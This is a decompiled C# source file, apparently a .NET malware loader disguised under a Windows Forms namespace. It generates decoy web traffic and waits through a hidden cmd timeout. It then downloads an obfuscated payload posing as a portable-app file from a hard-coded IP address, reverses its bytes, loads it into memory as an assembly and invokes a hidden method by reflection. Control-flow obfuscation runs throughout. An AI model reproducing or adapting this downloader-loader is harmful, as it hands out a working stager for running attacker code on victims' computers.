using System;
using System.Diagnostics;
using System.Net;
using System.Reflection;
using System.Threading;

namespace WindowsFormsApp48.Google;

internal static class Visitor
{
	private static Visitor ReflectDefinition;

	internal static void ComputePredicate()
	{
		string[] array = new string[4] { "http://google.com", "http://youtube.com", "http://bing.com", "http://yahoo.com" };
		int num = 0;
		string[] array2 = default(string[]);
		int num2 = default(int);
		string object_ = default(string);
		WebClient webClient = default(WebClient);
		while (true)
		{
			if (num >= 9)
			{
				GC.Collect();
				if (_003CModule_003E_007B733d650e_002De456_002D45c0_002Da44d_002D64a1e0c75f2d_007D.m_2c7b33f317874d349775adf3a029cb16 != 0)
				{
					break;
				}
				switch (3)
				{
				case 1:
					break;
				default:
					goto IL_0039;
				case 7:
					goto IL_0040;
				case 5:
					goto IL_0047;
				case 2:
				case 6:
					goto IL_008c;
				case 3:
					continue;
				case 4:
					return;
				}
			}
			array2 = array;
			num2 = 0;
			goto IL_008c;
			IL_0039:
			object_ = array2[num2];
			goto IL_0040;
			IL_0040:
			webClient = new WebClient();
			goto IL_0047;
			IL_0047:
			try
			{
				string value = (string)InitDefinition(webClient, object_);
				Console.WriteLine(value);
				if (_003CModule_003E_007B733d650e_002De456_002D45c0_002Da44d_002D64a1e0c75f2d_007D.m_1e1b7d4620cf42ba889a9e059790f772 != 0)
				{
					switch (0)
					{
					}
				}
			}
			catch
			{
			}
			finally
			{
				((IDisposable)webClient)?.Dispose();
			}
			num2++;
			goto IL_008c;
			IL_008c:
			if (num2 >= array2.Length)
			{
				num++;
				continue;
			}
			goto IL_0039;
		}
	}

	internal static void NewPredicate()
	{
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		catch
		{
		}
		bool flag = default(bool);
		MethodInfo methodInfo = default(MethodInfo);
		int num2 = default(int);
		MethodInfo[] methods = default(MethodInfo[]);
		int num3 = default(int);
		Type type = default(Type);
		Type[] exportedTypes = default(Type[]);
		int num4 = default(int);
		Assembly[] array2 = default(Assembly[]);
		Assembly assembly = default(Assembly);
		while (true)
		{
			Thread thread = new Thread(ComputePredicate)
			{
				IsBackground = true
			};
			thread.Start();
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd",
				Arguments = "/C timeout 20",
				WindowStyle = ProcessWindowStyle.Hidden
			})!.WaitForExit();
			byte[] array = null;
			while (true)
			{
				array = (byte[])typeof(WebClient).GetMethod((string)SearchDefinition("DowKnlKoadDKata", "K", ""), new Type[1] { IncludeDefinition(typeof(string).TypeHandle) })!.Invoke(new WebClient(), new object[1] { "http://82.146.63.54/Software/01171/WinObjPortable_3.13_English_online.paf.bin" });
				while (true)
				{
					Array.Reverse((Array)array, 0, array.Length);
					while (true)
					{
						IL_0161:
						LogoutDefinition(DefineDefinition(), array);
						int num = 1;
						if (_003CModule_003E_007B733d650e_002De456_002D45c0_002Da44d_002D64a1e0c75f2d_007D.m_305d2c21a6eb44de8e83d3cdf960fe58 != 0)
						{
							goto IL_0087;
						}
						goto IL_010f;
						IL_010f:
						while (true)
						{
							switch (num)
							{
							case 17:
								break;
							case 5:
								goto IL_001e;
							case 10:
							case 13:
								goto IL_0043;
							case 7:
								goto IL_004e;
							default:
								goto IL_0065;
							case 11:
								goto IL_0087;
							case 14:
								if (flag)
								{
									methodInfo.Invoke(null, null);
								}
								num2++;
								goto case 9;
							case 9:
								if (num2 >= methods.Length)
								{
									goto case 2;
								}
								methodInfo = methods[num2];
								Console.WriteLine((string?)ForgotDefinition(methodInfo));
								goto case 3;
							case 2:
								num3++;
								num = 15;
								if (_003CModule_003E_007B733d650e_002De456_002D45c0_002Da44d_002D64a1e0c75f2d_007D.m_074b1aa682c146ddaa1e8fb2cca739aa != 0)
								{
									continue;
								}
								break;
							case 3:
								flag = methodInfo.Name == "Fmybietdmtrgvub";
								num = 14;
								if (_003CModule_003E_007B733d650e_002De456_002D45c0_002Da44d_002D64a1e0c75f2d_007D.m_9cb6eb590e2e49808055e4864107dace != 0)
								{
									continue;
								}
								goto IL_0087;
							case 12:
								methods = type.GetMethods();
								goto case 6;
							case 6:
								num2 = 0;
								goto case 9;
							case 15:
								goto IL_0161;
							case 8:
								goto end_IL_0161;
							case 16:
								goto end_IL_0180;
							case 1:
								goto end_IL_018e;
							case 4:
								return;
							}
							break;
						}
						goto IL_0016;
						IL_0016:
						if (num3 < exportedTypes.Length)
						{
							goto IL_001e;
						}
						num4++;
						goto IL_0043;
						IL_001e:
						type = exportedTypes[num3];
						Console.WriteLine(type.FullName);
						num = 12;
						if (_003CModule_003E_007B733d650e_002De456_002D45c0_002Da44d_002D64a1e0c75f2d_007D.m_7ad8a9ed4b374166ad83e8ddb0efaa7c == 0)
						{
							goto IL_0087;
						}
						goto IL_010f;
						IL_0087:
						array2 = (Assembly[])InstantiateDefinition(AppDomain.CurrentDomain);
						num4 = 0;
						goto IL_0043;
						IL_0065:
						Console.WriteLine(assembly.FullName);
						exportedTypes = assembly.GetExportedTypes();
						num3 = 0;
						goto IL_0016;
						IL_0043:
						if (num4 >= array2.Length)
						{
							return;
						}
						goto IL_004e;
						IL_004e:
						assembly = array2[num4];
						num = 0;
						if (_003CModule_003E_007B733d650e_002De456_002D45c0_002Da44d_002D64a1e0c75f2d_007D.m_869c19334e1149efaa4cb74280b3debe == 0)
						{
							goto IL_0065;
						}
						goto IL_010f;
						continue;
						end_IL_0161:
						break;
					}
					continue;
					end_IL_0180:
					break;
				}
				continue;
				end_IL_018e:
				break;
			}
		}
	}

	internal static object InitDefinition(object object_0, object object_1)
	{
		return ((WebClient)object_0).DownloadString((string)object_1);
	}

	internal static bool LoginDefinition()
	{
		return ReflectDefinition == null;
	}

	internal static Visitor MapDefinition()
	{
		return ReflectDefinition;
	}

	internal static object SearchDefinition(object object_0, object object_1, object object_2)
	{
		return ((string)object_0).Replace((string)object_1, (string?)object_2);
	}

	internal static Type IncludeDefinition(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	internal static object DefineDefinition()
	{
		return AppDomain.CurrentDomain;
	}

	internal static object LogoutDefinition(object object_0, object object_1)
	{
		return ((AppDomain)object_0).Load((byte[])object_1);
	}

	internal static object InstantiateDefinition(object object_0)
	{
		return ((AppDomain)object_0).GetAssemblies();
	}

	internal static object ForgotDefinition(object object_0)
	{
		return ((MemberInfo)object_0).Name;
	}
}
